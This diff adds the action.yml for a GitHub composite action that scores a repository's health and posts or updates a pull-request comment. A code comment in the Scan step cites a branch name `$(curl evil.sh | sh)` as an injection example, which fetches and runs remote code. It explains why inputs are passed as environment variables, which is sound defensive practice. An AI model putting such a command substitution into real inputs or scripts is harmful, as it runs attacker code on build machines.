@@ -1,0 +1,227 @@
+name: 'Repo Health Score'
+description: 'Score a repository 0-100 on security, maintainability, and developer experience — with actionable fixes, not just numbers.'
+author: 'Marian Puțirac'
+
+branding:
+  icon: 'activity'
+  color: 'green'
+
+inputs:
+  path:
+    description: 'Repository root to scan, relative to the workspace.'
+    required: false
+    default: '.'
+  fail-under:
+    description: 'Fail the job when the score is below this number (0-100). Empty means never fail: the action reports, it does not gate.'
+    required: false
+    default: ''
+  base-ref:
+    description: >-
+      Ref to compare against, so the PR comment reports a delta rather than an
+      absolute score. Defaults to the pull request base branch. Needs the full
+      history — check out with `fetch-depth: 0`.
+    required: false
+    default: ''
+  comment:
+    description: 'Post (and update in place) a comment on the pull request. Needs `permissions: pull-requests: write`.'
+    required: false
+    default: 'true'
+  badge:
+    description: 'Write the badge SVG to this path. Empty means do not write one.'
+    required: false
+    default: ''
+  json:
+    description: 'Write the JSON report to this path, in addition to the run artifact.'
+    required: false
+    default: ''
+  token:
+    description: 'Token used to post the pull request comment.'
+    required: false
+    default: ${{ github.token }}
+
+outputs:
+  score:
+    description: 'The overall score, 0-100.'
+    value: ${{ steps.scan.outputs.score }}
+  grade:
+    description: 'The letter grade, A-F.'
+    value: ${{ steps.scan.outputs.grade }}
+  report:
+    description: 'Path to the JSON report.'
+    value: ${{ steps.scan.outputs.report }}
+
+runs:
+  using: 'composite'
+  steps:
+    # Bus factor reads `git log`. `actions/checkout` defaults to fetch-depth: 1,
+    # which leaves a one-commit history that git reports without complaint — so
+    # the module would score confidently from a lie. It degrades to N/A on its
+    # own; this only makes the cause visible in the log rather than a mystery.
+    - name: Check the checkout has history
+      shell: bash
+      working-directory: ${{ inputs.path }}
+      run: |
+        if [ "$(git rev-parse --is-shallow-repository)" = "true" ]; then
+          echo "::warning title=Shallow clone::Bus factor and the base-branch delta need full history. Check out with \`fetch-depth: 0\`."
+        fi
+
+    - name: Set up Node
+      uses: actions/setup-node@v4
+      with:
+        node-version: '22'
+        # Deliberately no `cache: npm`. For anyone using this action by name,
+        # `github.action_path` lives outside GITHUB_WORKSPACE, and setup-node
+        # resolves `cache-dependency-path` relative to the workspace — it would
+        # fail to find our lockfile and error out. Installing our own handful of
+        # dependencies uncached costs a few seconds; failing every consumer's
+        # workflow costs rather more.
+
+    # Gitleaks is downloaded once and verified against a checksum committed in
+    # this repository. Caching it keeps a scan off the network on every run but
+    # the first; a poisoned cache entry fails verification and is re-downloaded.
+    - name: Cache the Gitleaks binary
+      uses: actions/cache@v4
+      with:
+        path: ~/.cache/repo-health-score
+        key: repo-health-score-gitleaks-${{ runner.os }}-${{ runner.arch }}
+
+    - name: Build the scanner
+      shell: bash
+      working-directory: ${{ github.action_path }}
+      run: |
+        npm ci --no-audit --no-fund
+        npm run build
+
+    - name: Scan
+      id: scan
+      shell: bash
+      working-directory: ${{ inputs.path }}
+      # Inputs reach the script as environment variables, never interpolated
+      # into it. A branch named `$(curl evil.sh | sh)` is a string here; spliced
+      # into `run:` it would be a command.
+      env:
+        ACTION_PATH: ${{ github.action_path }}
+        INPUT_BASE_REF: ${{ inputs.base-ref }}
+        INPUT_BADGE: ${{ inputs.badge }}
+        INPUT_JSON: ${{ inputs.json }}
+        DEFAULT_BASE_REF: ${{ github.event_name == 'pull_request' && format('origin/{0}', github.base_ref) || '' }}
+      run: |
+        set -euo pipefail
+
+        report="$(mktemp -d)/report.json"
+        comment="$(mktemp -d)/comment.md"
+
+        base_ref="${INPUT_BASE_REF:-$DEFAULT_BASE_REF}"
+
+        # Built as an array, not a string: a path containing a space must stay
+        # one argument. `if` rather than `[ … ] && …`, because under `set -e` a
+        # false test at the end of an AND-list exits the script.
+        args=(--json "$report" --comment "$comment")
+        if [ -n "$base_ref" ]; then args+=(--base-ref "$base_ref"); fi
+        if [ -n "$INPUT_BADGE" ]; then args+=(--badge "$INPUT_BADGE"); fi
+
+        # The gate runs as its own step below. Passing --fail-under here would
+        # exit non-zero and skip the comment — withholding the explanation of
+        # the failure at exactly the moment it is needed.
+        node "$ACTION_PATH/bin/cli.js" . "${args[@]}"
+
+        if [ -n "$INPUT_JSON" ]; then
+          mkdir -p "$(dirname "$INPUT_JSON")"
+          cp "$report" "$INPUT_JSON"
+        fi
+
+        # The trailing newline is load-bearing: `read` returns non-zero when it
+        # reaches EOF without hitting its delimiter, and under `set -e` that
+        # would fail the step immediately after a perfectly successful scan.
+        read -r score grade < <(REPORT="$report" node -e '
+          const report = JSON.parse(require("node:fs").readFileSync(process.env.REPORT, "utf8"));
+          process.stdout.write(`${report.score} ${report.grade}\n`);
+        ')
+
+        {
+          echo "score=$score"
+          echo "grade=$grade"
+          echo "report=$report"
+          echo "comment=$comment"
+        } >> "$GITHUB_OUTPUT"
+
+    # `always()`, because a failing scan is exactly when someone needs to read
+    # what it found. The file is absent if the scan died before writing it.
+    - name: Summarise the run
+      if: ${{ always() && steps.scan.outputs.comment != '' }}
+      shell: bash
+      env:
+        COMMENT: ${{ steps.scan.outputs.comment }}
+      run: |
+        if [ -f "$COMMENT" ]; then cat "$COMMENT" >> "$GITHUB_STEP_SUMMARY"; fi
+
+    # One comment per pull request, edited in place. A PR with fifteen pushes
+    # should not accumulate fifteen score comments, so the hidden marker in the
+    # body is how a later run finds the one it already wrote.
+    - name: Comment on the pull request
+      if: ${{ inputs.comment == 'true' && github.event_name == 'pull_request' }}
+      shell: bash
+      env:
+        GH_TOKEN: ${{ inputs.token }}
+        COMMENT: ${{ steps.scan.outputs.comment }}
+        PR: ${{ github.event.pull_request.number }}
+        REPO: ${{ github.repository }}
+        IS_FORK: ${{ github.event.pull_request.head.repo.fork }}
+      run: |
+        set -euo pipefail
+
+        # `pull_request` from a fork grants a read-only token. Posting would 403
+        # and fail the job over a comment, which is not what the scan is for.
+        if [ "$IS_FORK" = "true" ]; then
+          echo "::notice title=Comment skipped::A pull request from a fork gets a read-only token. The score is in the job summary."
+          exit 0
+        fi
+
+        # --paginate runs the jq filter once per page, so a `.[0]` inside it
+        # yields one id per page rather than one overall. Emit a stream of ids
+        # and keep the first line. Not `| head -1`: that closes the pipe early,
+        # and the resulting SIGPIPE fails the step under `pipefail`.
+        ids="$(gh api "repos/$REPO/issues/$PR/comments" --paginate \
+          --jq '.[] | select(.body | startswith("<!-- repo-health-score -->")) | .id')"
+        existing="${ids%%$'\n'*}"
+
+        if [ -n "$existing" ]; then
+          gh api --method PATCH "repos/$REPO/issues/comments/$existing" \
+            -F body=@"$COMMENT" --silent
+        else
+          gh api --method POST "repos/$REPO/issues/$PR/comments" \
+            -F body=@"$COMMENT" --silent
+        fi
+
+    # Last, so the comment above is posted even when the gate trips. A CI gate
+    # that hides the reason it failed is worse than no gate.
+    - name: Enforce the threshold
+      if: ${{ inputs.fail-under != '' }}
+      shell: bash
+      env:
+        SCORE: ${{ steps.scan.outputs.score }}
+        GRADE: ${{ steps.scan.outputs.grade }}
+        THRESHOLD: ${{ inputs.fail-under }}
+      run: |
+        set -euo pipefail
+
+        # Same range the CLI enforces. Without the upper bound, a slipped
+        # keystroke — `fail-under: 700` — would fail a flawless repository with
+        # "below the threshold of 700" rather than naming the real mistake.
+        case "$THRESHOLD" in
+          ''|*[!0-9]*)
+            echo "::error title=Bad input::fail-under must be an integer between 0 and 100, got \"$THRESHOLD\"."
+            exit 1
+            ;;
+        esac
+
+        if [ "$THRESHOLD" -gt 100 ]; then
+          echo "::error title=Bad input::fail-under must be an integer between 0 and 100, got \"$THRESHOLD\"."
+          exit 1
+        fi
+
+        if [ "$SCORE" -lt "$THRESHOLD" ]; then
+          echo "::error title=Repo Health Score $GRADE ($SCORE/100)::Below the fail-under threshold of $THRESHOLD."
+          exit 1
+        fi
+        echo "Repo Health Score $GRADE ($SCORE/100) meets the threshold of $THRESHOLD."
